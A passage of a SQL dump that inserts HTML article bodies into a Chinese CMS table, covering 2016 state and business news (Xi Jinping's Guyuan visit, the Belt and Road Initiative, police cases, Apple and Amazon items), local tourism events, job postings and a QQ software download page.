2em;\">【习近平：固原的发展脱胎换骨，增强了我们打赢脱贫攻坚战的信心】习近平坐在杨岭村村民马克俊家的炕上，同村干部、党员代表、养牛大户和贫困户代表拉起家常。总书记说，我听你们说说心里话，咱们唠一唠。大家向总书记汇报近几年脱贫攻坚的情况，说党的政策确实确实太好太好了。习近平拉着马克俊的手说，你年纪比我小，是我老弟。看着你和乡亲们的生活越来越好我很高兴。西海固曾经“苦瘠甲天下”。这是我第3次到固原来。我提出再到比较艰苦的农村看一看。通过走访，了解到村里已经解决了饮水问题，住房等生活条件有了明显改善，还开始找到了产业脱贫的路子。全国还有5000万贫困人口，到2020年一定要实现全部脱贫目标。这是我当前最关心的事情。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142513not2.jpg\" title=\"4804757052710294014.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：农村脱贫奔小康，支部很重要】习近平称赞大湾乡杨岭村党支部第一书记兰竹林对村里的情况门儿清，说明工作比较扎实。他说，一个村子建设得好，关键要有一个好党支部。村党支部带领村民脱贫奔小康，只要有规划，有措施，真抓实干，群众拥护，就一定能把工作做好。希望你们把基层党组织和基层政权建设好，团结带领广大群众奔小康。我们还要更上一层楼!</p><p><br/></p><p style=\"text-indent: 2em;\">【总书记为村民算养牛收支账】宁夏固原市大湾乡杨岭村，习近平走进贫困户马克俊家，首先来到小院一角的牛棚。养牛是杨岭村产业脱贫的重要途径，村里的贫困户在政府帮扶下，每家饲养2头安格斯基础母牛、3头育肥牛。习近平询问肉牛出栏育肥、贷款等情况。“过去都是养大黄牛，如今养上了进口牛”，马克俊给总书记详细算起了现在的养牛收支明细账。养牛大户马全龙也来到了小院里，他告诉总书记，自家过去养了5头牛，如今有了10多头，还准备增加到20头。习近平勉励他说：“要发挥好示范带头作用，把好的经验传授给村民。”</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：防范市场风险，政府要做好信息服务】细雨绵绵，沃野千里。宁夏原州区彭堡镇姚磨村，习近平冒雨视察万亩冷凉蔬菜基地。蔬菜展台前，新鲜采摘的西兰花、紫甘蓝、辣椒、马铃薯等，整齐“列队”。边走边看，习近平问得仔细。“检测标准怎么样？”“一亩地收入多少？”“农活有技术员指导吗？”“喷灌设施一亩地成本多少？”村里的党员干部、种植大户簇拥在总书记身边。习近平和他们聊起土地承包费、务农打工费、入股分红等，询问他们生产中遇到的困难。一位农民说，感觉市场还不大稳定，想更好了解市场需求。习近平表示，防范市场风险，既需要经营个体敏锐把握，也需要政府加强服务，尤其要做好信息服务工作。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142548un62.jpg\" title=\"2176556949782138032.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142605p9xl.jpg\" title=\"17322238994688503995.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (23,'<p>　　为了贯彻落实贵州省委、省政府关于构建全域旅游、推动旅游“井喷式”增长和黔东南州委、州政府“用好生态文化两个宝贝，打造国内外知名的民族文化旅游目的地”的战略部署，凯里市委、市政府突出建设国际旅游城市、国家园林城市、国家创新型城市的功能定位，以“节庆搭台，旅游唱戏”的超常规举措，着力推动凯里旅游从初级阶段快速向中高级阶段演化。2016年“十一”黄金周推出了文化旅游系列活动。</p><p>　　1、一赛一节</p><p>　　“一赛”即“牛霸天下”2016首届中国•凯里斗牛国际标准赛，“一节”即2016中国•凯里牛崇拜文化艺术节。</p><p>　　活动共分为四个场地：(1)斗牛国际标准赛场：凯里市民族文化活动中心(民族体育场)。(2)牛崇拜文化艺术节第一会场：凯里市民族文化活动中心(民族体育场)场外。(3)牛崇拜文化艺术节第二会场：凯里苗侗风情园。(4)牛崇拜文化艺术节第三会场：凯里民族文化园。举办时间：“牛霸天下”2016首届中国•凯里斗牛国际标准赛10月1日至10月6日，每日下午一点开始。2016中国•凯里牛崇拜文化艺术节10月1日至3日，每天白天和晚上在三个会场均有不同活动。</p><p>　　2、“弘扬民族文化，共筑中国梦”苗族刺绣体验</p><p>　　活动时间：10月1日至10月9日。地点：苗妹非遗博物馆。活动内容：游客现场体验、设计、制作自己心仪的作品。</p><p>　　3、2016“国庆节”南花村约你做客</p><p>　　活动时间：10月1日至10月7日。地点：南花苗寨。活动内容：观原生态山水风光、赏苗族歌舞、学苗族刺绣、饮百年神泉、品苗家米酒、体验传统打糍粑。</p><p>　　4、“李宁红双喜杯”2016中国乒乓球协会会员联赛</p><p>　　活动时间：10月1日至10月7日。地点：凯里学院体育馆。来自全国各地600多名中国乒乓球协会会员参赛，世界乒乓球冠军马琳、国家乒乓球队金牌教练吴敬平亲临凯里为比赛开赛。</p><p>　　5、云谷田园观光康体系列活动</p><p>　　活动时间：10月1日至10月7日。地点：舟溪云谷田园生态农业观光园。活动内容：农业观光采摘和钓鱼比赛等趣味体验活动。</p><p>　　2016“十一”黄金周凯里地区文化旅游系列活动内容丰富，时间长、规模大，亮点多、参与性强，欢迎中外游客和广大市民积极参与体验。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (27,'<p style=\"text-indent: 2em; text-align: center;\"><img src=\"/u/cms/www/201609/23140225zalw.jpg\" title=\"641-(1).jpg\" alt=\"641-(1).jpg\"/></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">习近平为何如此看重“一带一路”建设？自他发出沿线国家和地区共建“一带一路”倡议三年来，都取得了哪些进展？</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">6月22日，国家主席习近平在塔什干乌兹别克斯坦最高会议立法院发表题为《携手共创丝绸之路新辉煌》的重要演讲。 新华社记者马占成摄</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2013年9月7日，习近平在出访中亚国家期间，首次提出共建“丝绸之路经济带”。同年10月，他又提出共同建设21世纪“海上丝绸之路”，二者共同构成了“一带一路”重大倡议。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">而今，三年了。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>“一带一路”这三年</strong></p><p style=\"text-indent: 2em;\"><strong><br/></strong></p><p style=\"text-indent: 2em;\">三年，筚路蓝缕，春华秋实。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在“一带一路”倡议提出的当年11月，十八届三中全会通过的《中共中央关于全面深化改革若干重大问题的决定》明确指出：“加快同周边国家和区域基础设施互联互通建设，推进丝绸之路经济带、海上丝绸之路建设，形成全方位开放新格局。”</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2014年11月的中央财经领导小组第八次会议专门研究了丝绸之路经济带和21世纪海上丝绸之路规划，发起建立亚洲基础设施投资银行和设立丝路基金。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在博鳌亚洲论坛2015年年会上，习近平呼吁各国积极参与“一带一路”建设。随后，中国政府发布《推动共建丝绸之路经济带和21世纪海上丝绸之路的愿景与行动》，明确了“一带一路”的共建原则、框架思路、合作重点、合作机制等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2016年3月，国家“十三五”规划纲要正式发布，“推进‘一带一路’建设”成为其中专门一章。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2016年8月，习近平在推进“一带一路”建设工作座谈会上，进一步提出8项要求。从统一思想到统筹落实，从金融创新到人文合作，从话语体系建设到安全保障，面面俱到。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">三年，蓝图由草创到一步步展开、一笔笔绘就。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">目前，已有100多个国家和国际组织参与到“一带一路”建设中来，中国同30多个沿线国家签署了共建合作协议、同20多个国家开展了国际产能合作，联合国等国际组织也态度积极，以亚投行、丝路基金为代表的金融合作不断深入，一批有影响力的标志性项目逐步落地。“一带一路”建设从无到有、由点及面，进度和成果超出预期。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">“一带一路”东联亚太经济圈，西接欧洲经济圈，跨越高山深海，正在逐步构建世界上最壮美的经济走廊。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (28,'<p style=\"text-indent: 2em;\">9月21日，上海浦东机场，犯罪嫌疑人刘某被上海警方从马来西亚押送回沪。警方供图</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">骗税3400万，潜逃境外3100多天，辗转日本、马来西亚等地。经过上海警方漫长的追捕，2016年9月21日上午，国际红色通缉令出逃人员刘某被缉捕归案，押送回沪。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">澎湃新闻从上海警方获悉，近期“猎狐”行动捷报频传。8月22日，涉嫌巨额诈骗的国际红通犯罪嫌疑人钱某潜逃17年后被警方从南美国家苏里南劝返；8月31日，利用证券账户开设“老鼠仓”牟利、涉案金额高达1.2亿元的犯罪嫌疑人刘某被警方从美国劝返。至此，今年上海警方已经成功缉捕或劝返境外在逃人员71人。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (29,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230906198i4y.jpeg\" title=\"qe.jpeg\" alt=\"qe.jpeg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">新华社深圳9月22日专电（记者孙飞）记者22日从深圳市公安局福田分局获悉，深圳数名二手房卖主，因房价上涨不愿履行协议与买家发生纠纷，并对深圳市中院相关判决不满，聚集60余人前往深圳市中院闹访。目前，5人因涉嫌聚众冲击国家机关罪被福田警方依法刑事拘留，并于9月14日由福田区人民检察院批准逮捕。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方介绍，今年8月22日上午，在马某某（男，31岁，江西吉安人）、郑某某（男，47岁，广东深圳人）等人带领下，60余人拒不接受现场工作人员安检的要求，冲入深圳市中级人民法院一楼东大厅，扰乱深圳市中级人民法院的单位秩序。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方接报后，组织警力赶到现场。在深圳市公安局统一指挥下，罗湖区、南山区公安分局警力也赶到现场支援处置工作。通过多方合力，62人被带离深圳中院。民警在现场收缴了大量标语横幅及文化衫等物品。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方通报称，经查，该案系马某某、郑某某等二手房卖主，在签订二手房买卖协议后因房价上涨不愿履行协议引发纠纷，并对深圳市中院的相关判决不满，带领从东莞雁田等地雇佣的40余人前往深圳中院闹访。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">当日，深圳警方对这62人给予行政处罚，其中，56人分别被处以5至15日行政拘留，6人被处以罚款。后经进一步侦查，马某某、郑某某等5人因涉嫌聚众冲击国家机关罪被深圳福田警方依法刑事拘留，并于9月14日由福田区人民检察院批准逮捕。目前，该案尚在进一步侦办中。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (30,'<p style=\"text-indent: 2em;\">中新网北京9月23日电 (吴涛)中新网从三大运营商处获悉，此前传北京地区未实名手机用户10月15日将被停机，实际是分批执行，10月15日开始，最晚至10月31日截止。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">其实，多地已开始执行不实名就停机政策，中新网(微信公众号：cns2012)对此进行了梳理，大部分地区都是分批执行，如用户在规定时间内未实名，将面临被停机甚至销号的处理。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>北京10月底前手机全部实名 否则停机</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">最近不少手机用户都收到通知，未实名手机用户将被停机。以北京为例，提示短信显示，10月15日起，未实名手机用户将被暂停通信服务。三大运营商相关负责人分别对中新网表示，在北京地区，10月15日起将执行非实名就停机政策，分批执行，最晚至10月底，非实名手机用户全部停机。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">至于其他省份，三大运营商表示，电信运营商省公司可以结合本地实际情况确定执行不实名就停机政策的具体日期。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国电信强调，地方分公司提出执行不实名就停机政策的时间节点，不得晚于集团提出的时间节点；中国移动表示，各省通信管理局或当地政府有规定的，优先按当地的规定执行。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">一些地方对手机实名补登记早就出了要求，江苏三家运营商按照省通信管理局要求，于7月22日发布公告称，自11月起暂停未实名手机用户的部分通信服务，12月起，停止仍未实名用户的全部通信服务。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">7月份，山东省公安厅和省通信管理局联合发布通告，自10月起暂停未实名用户的部分通信服务，2017年6月30日前，停止仍未实名用户的全部通信服务。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (32,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230919031knf.jpg\" title=\"138678572.jpg\" alt=\"138678572.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">成龙捐给台北故宫(微博)南院的12生肖兽首，面临斩首命运。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国台湾网9月22日讯 据台湾《联合报》报道，台北故宫院长林正仪今天（22日）表示，9月底将移除影星成龙捐赠台北故宫南院的12生肖兽首。对此，成龙经纪人EMMA傍晚传达成龙的意见表示，当初捐兽首给台北故宫，是因为台北故宫是一个“尊重文明，保护文化”的单位，若台北故宫对于“尊重文明，保护文化”有不同态度，“那我们也尊重”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">成龙捐赠给台北故宫南院的12生肖兽首复制品，目前放置在台北故宫南院主建筑物外广场。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">EMMA指出，成龙将兽首捐给台北故宫时，想表达的“尊重文明 保护文化”的态度已经完成，“这整件事是一个态度传达的艺术行为”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据报道，成龙也曾捐赠一组相同的兽首给新加坡国立亚洲文明博物馆。EMMA指出，成龙捐赠兽首，捐给台北故宫和捐给新加坡国立亚洲文明博物馆，传达的态度是一样的，就是“尊重文明，保护文化”。“我们捐的不是艺术品或工艺品，而是传达一个态度。”捐给台北故宫，是因为它是一个“尊重文明，保护文化”的单位。若台北故宫对于“尊重文明，保护文化”有不同态度，“那我们也尊重”。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (33,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/23092247x1xp.jpg\" title=\"138679618.jpg\" alt=\"138679618.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">亚马逊季度利润连续三个财季创下新纪录。随之而来的是，亚马逊股价也打破了记录。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">亚马逊的股价在纽约当地时间周四上午首次突破每股800美元大关。亚马逊以3860亿美元的市值稳居全球上市公司第四的位置，仅次于苹果、谷歌(微博)母公司Alphabet和微软。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在过去的仅仅七个月时间里，亚马逊的股价大涨了40%。推动亚马逊股价增长的主要原因是亚马逊云计算业务AWS的增长及其带来的惊人利润。另外，亚马逊数千万Prime会员也贡献颇多，这些会员要比非会员更经常购物，而且购物支出也比非会员要多得多。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (36,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230939278x02.jpg\" title=\"138679965.jpg\" alt=\"138679965.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">9月20日，匹凸匹投资者索赔案开庭，有十多位投资者向匹凸匹发起索赔。今年3月，匹凸匹公告，因未及时披露多项对外重大担保、重大诉讼事项及2013年年报中未披露对外重大事项，证监会对匹凸匹处40万元罚款，对鲜言处30万元罚款。前述投资者认为因虚假陈述行为而受到损失。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">事实上，这也是匹凸匹原实际控制人鲜言给“海银系”掌门人韩宏伟的遗留问题。去年底，“海银系”以五牛基金为主力从鲜言手中接盘饱受争议的匹凸匹。韩宏伟与韩啸系父子关系。大半年过去，韩氏父子与鲜言的关系也从起初的甜蜜期走到如今对簿公堂。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">对于有着同窗情谊的两者是真翻脸还是另有图谋，投资者更为关心的是，韩氏父子掌控的“海银系”对匹凸匹未来发展有怎样的考虑，是否会注入资产让匹凸匹改头换面，而不是再次陷入“资本漩涡”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>实控人背后关联重重</strong><br/></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在资本市场叱咤风云的“海银系”为何要染指匹凸匹。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">近三年来，匹凸匹（原多伦股份）及鲜言在资本市场可谓劣迹斑斑，先后被证监会两次立案调查、两次公开谴责，1次警告、1次罚款，1次行政监管，并多次收到上交所的问询函。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">对于上海一中院开庭审理的十多位投资者诉匹凸匹案，上述投资者的代理律师上海市华荣律师事务所许峰对中国证券报记者表示，通过庭审判断，投资者最终获赔概率较大。其法律依据主要是，去年年底证监会针对匹凸匹未及时披露多项对外重大担保、重大诉讼事项做出了处罚。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">事实上，7月份，中证中小投资者服务中心代理散户起诉匹凸匹，将鲜言及原其他七名高管及匹凸匹公司作为共同被告诉至法院，诉请判令鲜言赔偿经济损失37万余元，其余八被告承担连带赔偿责任。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">有投行人士还对中国证券报记者透露，2014年11月底，鲜言拟将上市公司实际控制权转让给自然人殷群，最终因对方未付款而夭折。在五牛基金入主匹凸匹之前，资本大鳄吴鸣霄也与鲜言谈过买壳，但最终不知为何没有谈拢。值得注意的是，目前颇受关注的ST慧球(13.300, 0.01, 0.08%)第一大自然人股东就是吴鸣霄，而ST慧球被指背后的实际控制人是鲜言。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">上述人士指出，在历经陈隆基、李勇鸿、鲜言的多次进进出出。多伦股份主营业务变更不断，从房地产、金融又回到房产，唯一不变的是业绩不见起色，并一步步走向“空壳”状态。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (37,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/23094218axhy.jpg\" title=\"138679463.jpg\" alt=\"138679463.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">近日，美国联邦通信委员会意外曝光了苹果正在研发的一款新设备，其体积类似于苹果机顶盒（Apple TV），具体的用途尚不得而知。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据美国科技新闻网站AppleInsider报道，联邦通信委员会的数据库中出现了这款苹果尚未对外宣布的新产品，其螺丝位置和设备外壳的大小，类似于第四代苹果机顶盒。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">苹果一直拥有对外保密的传统，而在这款新设备中，苹果也要求不对外泄漏相关信息，因此媒体无法判断到底作何用途。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这款设备使用的型号A1844，目前并未被苹果发售的商品使用过。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据称，该设备的电源参数为5.5V到13.2V,输出电流为100毫安，峰值为700毫安。这些参数有别于苹果最新的机顶盒，其电源参数为12V、920毫安。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这款设备还具有蓝牙通信和NFC（近场通信）功能，美国联邦通信委员会也对这些通信功能进行了测试，相关的无线电通信功能也是这款设备提交到该机构进行测试的原因。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这一设备没有进行Wi-Fi通信测试，可能意味着会采用目前某个设备的Wi-Fi通信技术，或者根本就不具备Wi-Fi通信功能。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">此前，外部机构曾经对苹果第四代机顶盒进行过拆解，相关的螺丝位置，和此次对外披露的设备有类似之处。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">近些年，苹果的研发资源集中在了智能手机、平板电脑等领域，传统的机顶盒似乎受到了冷落。去年，在长期不更新之后，苹果推出了全新第四代的机顶盒，苹果推出了专有的机顶盒操作系统，在遥控器中植入了语音操控工具Siri。库克也表示，电视的未来是应用软件。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">苹果也围绕机顶盒构建了一个客厅互联网的生态系统，许多第三方开发商正在为苹果机顶盒开发电视端的应用软件。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em; text-align: center;\"><img src=\"/u/cms/www/201609/230943156ihf.jpg\" title=\"138679317.jpg\" alt=\"138679317.jpg\"/></p><p style=\"text-indent: 2em; text-align: center;\">第四代苹果机顶盒</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">此次披露的设备，是否是未来第五代的苹果机顶盒，仍无法判断。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (39,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230954058tco.jpg\" title=\"138678243.jpg\" alt=\"138678243.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">中国地震台网正式测定：09月23日00时47分在四川甘孜州理塘县（北纬30.09度，东经99.64度）发生4.9级地震，震源深度19千米。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (43,'<p>工作职责：<br/>1、负责Web前端多终端产品的整体框架设计；<br/>2、引导前沿技术的预研与实施，通用模块的搭建与维护；<br/>3、负责Web前端开发规范与流程的指定；<br/>4、负责团队成员的技术发展方向及成长；<br/>5、与相关业务部门沟通，协调内部资源，管理前端外包团队。<br/><br/>任职资格：<br/>1、计算机科学或相关专毕业，5年以上工作经验；<br/>2、精通JavaScript、Html5、Css3、NodeJS等Web开发技术；<br/>3、关注Web前端前沿技术发展，具有根据项目情况进行技术选型的能力；<br/>4、熟悉W3C标准，对表现与数据分离、Web语义化等有深刻理解；<br/>5、具有软件工程意识，对数据结构和算法设计有充分理解；<br/>6、具有良好的沟通能力和团队合作精神、优秀的分析问题和解决问题的能力；<br/>7、熟悉Linux平台，掌握一种后端开发语言（PHPJavaCC++Python等）。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (44,'<p>基本要求：&nbsp;<br/>1、精通ASP.NET（C#），熟悉三层架构，精通Web　Services开发，良好的面向对象开发经验；&nbsp;<br/>2、精通AJAX技术运用；<br/>3、精通SqlServer，熟练编写存储过程；&nbsp;<br/>4、精通div,css前端布局；&nbsp;<br/>5、必须有一年以上ASP.NET开发经验，有3个以上完整div＋css、asp.net网站制作或系统研发作品。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (45,'<p>岗位职责：</p><p>1、大专及以上学历，新闻采编相关专业毕业；</p><p>2、1年以上工作经历，有较好的文字功底；</p><p>3、认真务实，态度端正。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (46,'<p>岗位职责：<br/>1、负责电信天网工程项目；<br/>2、负责施工小队工程进度、质量管理<br/>3、负责甲方、监理及相关方协调；<br/><br/>任职资格：<br/>1、专科以上学历，有工程管理经验者优先，熟悉电信流程者优先</p><p>2、良好的理解和表达能力，善于沟通，很好的团队合作意识。<br/></p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (47,'<p>1、大专或大专以上应往届毕业生&nbsp;</p><p>2、理工类毕业生，计算机相关专业优先<br/></p><p>3、对软件行业有强烈的兴趣<br/></p><p>4、有良好的执行力，致力于软件行业发展<br/></p><p>5、后期发展从事网页设计，网站美工，网站开发，互联网系统开发等方向</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (48,'<p>岗位职责：<br/>1、负责Android互联网应用的开发及维护；<br/>2、根据项目需要快速学习并掌握新技术；<br/><br/>职位描述：<br/>1、具有扎实的Java基础，熟练掌握J2ME、J2SE等相关技术及代码优化技巧（容量、内存、速度）；<br/>2、熟悉TCP/IP通信机制，对Socket通信和HTTP通信有较深刻的理解和经验，有网络编程经验；<br/>3、熟悉Android操作系统和AndirodSDK,有一年以上Andriod开发经验优先&nbsp;<br/>4、具备良好的沟通能力和优秀的团队协作能力；<br/>5、优秀的文档编写和语言表达能力，良好的中英文阅读水平；<br/>6、诚恳、踏实、谨慎细致，对工作充满热情，优秀的学习能力，具有良好的自律意识和上进心；<br/>7、有嵌入式LinuxC/C++开发经验优先 ；<br/>8、熟悉MS SQL数据库开发。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (49,'<p>岗位条件：<br/>1、年龄18-28周岁；<br/>2、学历大专及以上，理工科专业毕业优先录用；<br/>3、对互联网行业感兴趣（非销售、非保险岗位），懂编程语言优先考虑，但是也可以接收零基础求职者，有项目经理带团队；<br/>4、工作认真、细致、敬业，责任心强；<br/>5、想获得一份有长远发展、稳定、有晋升空间的工作。</p><p><br/>待遇：<br/>1、转正基本薪资3500起，另有项目奖金和提成；<br/>2、五险一金，双休、法定节假日，正常休息；<br/>3、公司工作环境优雅、氛围好，同事关系融洽，生日派对、聚餐等活动丰富；<br/>4、公司注重员工培养，给予晋升机会，管理层主要员工中培养、提拔；</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (50,'<p>岗位要求：</p><p>1、喜欢从事计算机设计行业；</p><p>2、想获得一份稳定的工作；</p><p>3、好学、细心，喜欢发现事物当中的不足，责任心强。</p><p><br/></p><p>任职要求：</p><p>1、能够尽快入职、长期稳定工作。</p><p>2、大专及大专以上学历。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (51,'<p>岗位职责：<br/>1.熟悉微信的各项功能应用，擅长企业微信的日常操作以及维护<br/>2.根据企业的受众群体可以养成数据分析能力，善于通过数据分析掌握时间段与顾客互动.更新及维护公司企业微信内容，提高各项关注度，提升转化率。&nbsp;<br/>3.负责企业微信的运营策略、活动、话题的制定及策划方案和活动创意、活动宣传，完成微信营销。&nbsp;<br/>4.挖掘和分析粉丝使用习惯，情感及体验感受，及时掌握新闻热点，与用户进行互动。&nbsp;<br/>5.具有一定的市场分析及判断能力，具有良好的客户服务意识，具有亲和力。&nbsp;<br/>6.跟踪微信推广效果，分析数据并反馈，分享微信推广经验，推动及提高团队的网络推广能力。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (69,'<p>腾讯推出的即时通讯工具。支持在线聊天、视频电话、点对点断点续传文件、共享文件、网络硬盘、自定义面板、QQ邮箱等多种功能。免费的通讯平台，QQ2015年给您带来更多沟通乐趣。</p><p><br/></p><p>开发商：腾讯</p><p><br/></p><p>新版特征</p><p>1.文件共享，便捷分享本地文件；</p><p>2.群组通话管理，有序发言，掌控全场；</p><p>3.团队通讯录，快速查看群成员电话。</p><p><br/></p><p><strong>下载说明</strong></p><p><br/></p><p>1、推荐使用迅雷等下载工具下载本站软件，使用 WinRAR v3.10 以上版本解压本站软件。<br/></p><p>2、如果该软件不能下载，请留言报告错误,谢谢合作。</p><p>3、下载本站资源时，如果遇到服务器忙暂不能下载的情况，请过一段时间重试。</p><p>4、如果您有任何意见或建议，欢迎给我们留言，我们将提供更多 